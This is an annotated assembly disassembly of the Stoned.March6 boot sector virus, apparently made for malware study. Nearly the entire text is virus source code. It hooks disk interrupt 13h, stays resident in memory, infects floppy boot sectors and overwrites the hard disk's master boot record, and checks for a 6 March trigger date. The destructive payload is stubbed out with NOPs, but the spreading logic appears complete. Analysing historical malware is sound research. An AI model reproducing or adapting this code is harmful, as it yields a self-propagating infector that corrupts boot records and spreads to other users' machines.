; Disassembly of `Virus.Boot.Stoned.March6.t`.
;
; Source: boot sector dump (MD5: 7a9f3834b69a6137cdf49ee304ea41ba).

              org 7c00h

k_trigger_date:             equ 0x0306  ; 6 March
k_stored_on_hard_disk:      equ 07h     ; CX value (cylinder/sector), for Int 13/AH 03
k_stored_on_other_floppy:   equ 0Eh     ; ^^
k_stored_on_360_floppy:     equ 03h     ; ^^

virus_start:

              jmp word entry_point

v_virus_offset:            dw entry_point_from_resident_address   ; fixed, not a variable.
v_virus_segment:           dw 09F80h                              ; variable.
v_destruction_head_number: db 2
v_current_storage:         dw k_stored_on_hard_disk
v_int_13:                  dd 0

int_13_handler:

              push ds
              push ax
              or dl,dl                       ; operation on floppy (0)?
              jnz return_to_int_13
              xor ax,ax
              mov ds,ax
              test byte [0x43f],0x1          ; bios: diskette motor status
              jnz return_to_int_13           ; floppy drive motors active? return.
              pop ax
              pop ds
              pushfw
              call word far [cs:v_int_13]
              pushfw
              call word infect_floppy
              popfw
              retf 2

return_to_int_13:

              pop ax
              pop ds
              jmp word far [cs:v_int_13]

infect_floppy:

              push ax
              push bx
              push cx
              push dx
              push ds
              push es
              push si
              push di

              push cs
              pop ds
              push cs
              pop es

read_floppy_boot_sector:

              mov si,0x4    ; try four times

read_attempt:
              mov ax,0x201  ; read, one sector
              mov bx,memory_buffer
              mov cx,0x1    ; sector one
              xor dx,dx     ; floppy
              pushfw
              call word far [v_int_13]
              jnc read_successful
              xor ax,ax     ; reset disk
              pushfw
              call word far [v_int_13]
              dec si
              jnz read_attempt
              jmp short pop_registers_and_return

read_successful:

              xor si,si
              cld
              lodsw
              cmp ax,[bx]       ; compare virus begin with sector just read
              jnz floppy_is_not_infected
              lodsw
              cmp ax,[bx+0x2]   ; first 4 bytes equal? return.
              jz pop_registers_and_return

floppy_is_not_infected:

              mov ax,0x301      ; write, one sector
              mov dh,0x1        ; head 1
              mov cl,k_stored_on_360_floppy
              cmp byte [bx+0x15],0xfd  ; Bios Parameter Block, 0x15 FD = 360kb
              jz location_12           ; see https://en.wikipedia.org/wiki/Design_of_the_FAT_file_system#BPB20
              mov cl,k_stored_on_other_floppy
location_12:
              mov [v_current_storage],cx
              pushfw
              call word far [v_int_13]
              jc pop_registers_and_return

              mov si,0x3be
              mov di,partition_table_start_addr - virus_start
              mov cx,0x21
              cld
              rep movsw

              mov ax,0x301  ; write, one sector
              xor bx,bx
              mov cx,0x1    ; sector 1
              xor dx,dx     ; floppy
              pushfw
              call word far [v_int_13]

pop_registers_and_return:
              pop di
              pop si
              pop es
              pop ds
              pop dx
              pop cx
              pop bx
              pop ax
              ret

entry_point:

              xor ax,ax
              mov ds,ax
              cli               ; disable interrupts
              mov ss,ax         ; set stack: 0000:7C00h=standard stack on boot
              mov ax,0x7c00
              mov sp,ax
              sti               ; restore interrupts

              push ds           ; store 0000:7C00h for returning to original boot
              push ax

              mov ax,[0x4c]     ; copy int 0x13
              mov [v_int_13],ax
              mov ax,[0x4e]
              mov [v_int_13+2],ax

copy_to_memory:

              mov ax,[0x413]                       ; 0x413: bios (available) memory size.
              dec ax                               ; decrease it by 2k.
              dec ax
              mov [0x413],ax

              mov cl,0x6                            ; set ES to the virus segment (hole address; convert
              shl ax,cl                             ; from KiB to segments).
              mov es,ax
              mov [v_virus_segment],ax

              mov ax,int_13_handler                 ; hijack int 13h (DS=0)
              mov [0x4c],ax
              mov [0x4e],es

              mov cx,(virus_disk_end-virus_start)   ; copy to memory
              mov si,virus_start
              xor di,di
              cld
              rep movsb

              jmp word far [cs:v_virus_offset]

entry_point_from_resident_address:

              xor ax,ax                             ; reset drive
              mov es,ax
              int 0x13

              push cs
              pop ds
              mov ax,0x201                          ; read, one sector
              mov bx,virus_start                    ; buffer at resident virus location (offset 0)
              mov cx,[v_current_storage]
              cmp cx,k_stored_on_hard_disk
              jnz from_floppy

from_disk:

              mov dx,0x80           ; head 0, hard disk
              int 0x13
              jmp short check_current_date

from_floppy:

              mov cx,[v_current_storage]  ; redundant instruction (!)
              mov dx,0x100                ; head 1, floppy disk
              int 0x13
              jc check_current_date

read_hard_disk_boot_sector:

              push cs
              pop es
              mov ax,0x201                ; read, one sector
              mov bx,memory_buffer
              mov cx,0x1                  ; sector 1
              mov dx,0x80                 ; head 0, hard disk
              int 0x13
              jc check_current_date

check_if_infected:

              xor si,si
              cld
              lodsw
              cmp ax,[bx]                  ; compare first 2 bytes of virus signature with boot sector
              jnz infect_hard_disk
              lodsw
              cmp ax,[bx+0x2]              ; compare next 2 bytes (total 4-byte signature check)
              jnz infect_hard_disk

check_current_date:

              xor cx,cx
              mov ah,0x4                    ; get date
              int 0x1a
              cmp dx,k_trigger_date
              jz destruction_routine
              retf

destruction_routine:

              times 60 db 90h               ; destructive code

infect_hard_disk:
              mov cx,k_stored_on_hard_disk
              mov [v_current_storage],cx
              mov ax,0x301                  ; write, one sector
              mov dx,0x80                   ; disk
              int 0x13
              jc check_current_date

              mov si,0x3be
              mov di,partition_table_start_addr
              mov cx,(partition_table_end - partition_table_start_addr)/2 + 2
              rep movsw

              mov ax,0x301                  ; write, one sector
              xor bx,bx
              inc cl                        ; sector 1 (MBR) - CX=0 after REP MOVSW, INC CL→1
              int 0x13
              jmp short check_current_date

padding:      times 16 db 0

virus_disk_end:

partition_table:
                            db 80h            ; drive C
partition_table_start_addr: db 1, 1, 0        ; start_addr
                            db 4              ; system_type
                            db 3, 0x9a, 0x5c  ; partition_end_addr
                            dd 0x0000001a     ; physical_sector_start
                            dd 0x0000f5ae     ; partition_length
                            times 48 db 0
partition_table_end:

              dw 0xaa55         ; boot sector marker

memory_buffer: times 512 db 0
